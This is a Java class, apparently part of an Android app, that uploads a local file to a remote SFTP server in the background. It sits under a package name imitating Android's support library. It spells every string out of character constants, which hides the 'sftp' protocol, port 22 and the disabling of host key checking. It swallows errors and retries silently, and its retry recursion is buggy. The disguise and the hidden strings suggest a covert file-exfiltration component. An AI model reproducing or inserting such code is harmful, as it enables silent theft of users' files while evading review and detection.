package android.support.v4.os.storage;

import java.io.File;
import java.io.FileInputStream;

import android.support.v4.lang.Strings;
import android.support.v4.util.AsyncTask;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpProgressMonitor;

/*
 * Copyright (c) 2014 Kenneth Tu <don.ling.lok@gmail.com>
 *
 * All rights reserved. No warranty, explicit or implicit, provided.
 *
 * @author Kenneth Tu
 * @version 1.0.0
 */
public class SFTPUploadTask extends AsyncTask<Void, Void, String> {
	private final transient String sftpPort = Strings.fString(Strings.TWO,
			Strings.TWO);
	private final transient String sftpHost;
	private final transient String sftpUser;
	private final transient String sftpPass;
	private final transient String dir;
	private final transient String path;
	private final transient SftpProgressMonitor monitor;
	private transient int uploadTry = 3;

	// public interface SFTPUploadTaskCallback {
	// void onReturn(Boolean result);
	// }

	public SFTPUploadTask(final String sftpHost, final String sftpUser,
			final String sftpPass, final String dir, final String path,
			final SftpProgressMonitor monitor) {
		super();
		this.sftpHost = sftpHost;
		this.sftpUser = sftpUser;
		this.sftpPass = sftpPass;
		this.dir = dir;
		this.path = path;
		this.monitor = monitor;
	}

	@Override
	protected String doInBackground(final Void... params) {
		try {
			final JSch jsch = new JSch();
			final Session session = jsch.getSession(sftpUser, sftpHost,
					Integer.parseInt(sftpPort));
			session.setPassword(sftpPass);
			final java.util.Properties config = new java.util.Properties();
			config.put(Strings.fString(Strings.UPPS, Strings.LOWT,
					Strings.LOWR, Strings.LOWI, Strings.LOWC, Strings.LOWT,
					Strings.UPPH, Strings.LOWO, Strings.LOWS, Strings.LOWT,
					Strings.UPPK, Strings.LOWE, Strings.LOWY, Strings.UPPC,
					Strings.LOWH, Strings.LOWE, Strings.LOWC, Strings.LOWK,
					Strings.LOWI, Strings.LOWN, Strings.LOWG), Strings.fString(
					Strings.LOWN, Strings.LOWO));
			session.setConfig(config);
			session.connect();
			final Channel channel = session.openChannel(Strings.fString(
					Strings.LOWS, Strings.LOWF, Strings.LOWT, Strings.LOWP));
			channel.connect();
			final ChannelSftp channelSftp = (ChannelSftp) channel;
			final File file = new File(path);
			if (null != dir) {
				channelSftp.cd(dir);
			}
			// Log.e(Strings.EMPTY, Strings.valueOf(file.length() / 1024));
			channelSftp.put(new FileInputStream(file), file.getName(), monitor);
			channelSftp.disconnect();
			channel.disconnect();
			session.disconnect();
		} catch (final Exception exception) {
			// exception.printStackTrace();
			if (uploadTry > 0) {
				doInBackground(params);
				uploadTry--;
			} else {
				uploadTry = 3;
			}
		}

		return Strings.EMPTY;
	}

}